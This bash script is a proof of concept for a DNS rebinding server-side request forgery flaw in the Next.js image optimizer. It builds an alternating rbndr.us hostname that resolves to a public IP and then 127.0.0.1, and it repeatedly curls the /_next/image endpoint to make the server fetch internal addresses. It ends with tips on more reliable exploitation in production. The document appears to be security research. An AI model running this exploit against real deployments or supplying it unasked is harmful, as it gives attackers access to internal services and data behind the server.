#!/bin/bash
#
# Next.js Image Optimizer DNS Rebinding SSRF PoC
# ================================================
#
# VULNERABILITY: TOCTOU in fetchExternalImage() 
# Location: packages/next/src/server/image-optimizer.ts lines 716-741
#
# The vulnerability:
# 1. Line 720: DNS lookup with lookup() 
# 2. Line 727: isPrivateIp() check on resolved IPs
# 3. Line 738: fetch(href) - uses HOSTNAME, not resolved IP!
#
# Between steps 2 and 3, the DNS can return a different IP.
# Node.js fetch() does its own DNS lookup, which could return
# an internal IP after the first lookup returned a public IP.
#
# ATTACK REQUIREMENTS:
# - Target Next.js app has external domain in remotePatterns
# - Attacker controls DNS for that domain (or subdomain)
# - DNS server returns public IP first, then internal IP
#
# NO MITM NEEDED - This is browser-exploitable!
#

set -e

TARGET="${1:-http://localhost:3000}"

echo "=============================================="
echo " Next.js DNS Rebinding SSRF PoC"
echo "=============================================="
echo ""
echo "Target: $TARGET"
echo ""

# Check if image optimization endpoint exists
echo "[1] Checking image optimization endpoint..."
STATUS=$(curl -sI "$TARGET/_next/image?url=/test.png&w=100&q=75" | head -1)
echo "    Status: $STATUS"

# Create a DNS rebinding hostname
# rbndr.us format: <IP1>.<IP2>.rbndr.us
# It alternates between IP1 and IP2 on each DNS query
PUBLIC_IP="93.184.216.34"  # example.com
INTERNAL_IP="127.0.0.1"

REBINDING_HOST="${PUBLIC_IP}.${INTERNAL_IP}.rbndr.us"
REBINDING_URL="http://${REBINDING_HOST}:3000/"

echo ""
echo "[2] DNS Rebinding Setup"
echo "    Rebinding hostname: $REBINDING_HOST"
echo "    This hostname alternates between:"
echo "      - $PUBLIC_IP (public, passes isPrivateIp check)"
echo "      - $INTERNAL_IP (internal, SSRF target)"
echo ""

# Test DNS resolution
echo "[3] Testing DNS resolution..."
dig +short "$REBINDING_HOST" || echo "    (dig not available, continuing)"
echo ""

# Test the attack
echo "[4] Sending SSRF attack request..."
echo "    URL: $TARGET/_next/image?url=$REBINDING_URL&w=100&q=75"
echo ""

# Multiple attempts needed because DNS rebinding is probabilistic
for i in {1..5}; do
  echo "    Attempt $i..."
  RESPONSE=$(curl -sI "$TARGET/_next/image?url=$REBINDING_URL&w=100&q=75" 2>&1 | head -5)
  echo "$RESPONSE" | head -2
  
  if echo "$RESPONSE" | grep -q "200 OK"; then
    echo ""
    echo "    ✅ GOT 200 - Potential SSRF success!"
    break
  fi
  
  sleep 0.5
done

echo ""
echo "=============================================="
echo " Attack complete"
echo "=============================================="
echo ""
echo "NOTES:"
echo "- DNS rebinding is probabilistic, may need multiple attempts"
echo "- Success depends on DNS cache TTL and timing"
echo "- In production, attacker would use their own DNS server"
echo "  with very low TTL for reliable exploitation"
